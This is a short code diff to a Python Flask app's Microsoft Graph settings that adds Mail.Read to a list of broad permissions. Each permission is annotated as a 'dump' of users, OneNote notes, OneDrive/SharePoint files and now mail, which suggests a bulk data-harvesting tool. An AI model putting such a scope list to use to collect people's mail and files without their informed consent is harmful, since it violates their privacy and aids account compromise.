@@ -23,9 +23,10 @@ ENDPOINT = 'https://graph.microsoft.com/v1.0/users'  # This resource requires no
 # You can find the proper permission names from this document
 # https://docs.microsoft.com/en-us/graph/permissions-reference
 SCOPE = [
-    "User.ReadBasic.All",  # users                 dump
-    "Notes.ReadWrite.All", # oneNote               dump
-    "Files.Read.All ",     # oneDrive sharepoint   dump
+    "User.ReadBasic.All",    # users                 dump
+    "Notes.ReadWrite.All",   # oneNote               dump
+    "Files.Read.All",        # oneDrive sharepoint   dump
+    "Mail.Read",             # mail                  dump
     ]
 
 # Tells the Flask-session extension to store sessions in the filesystem
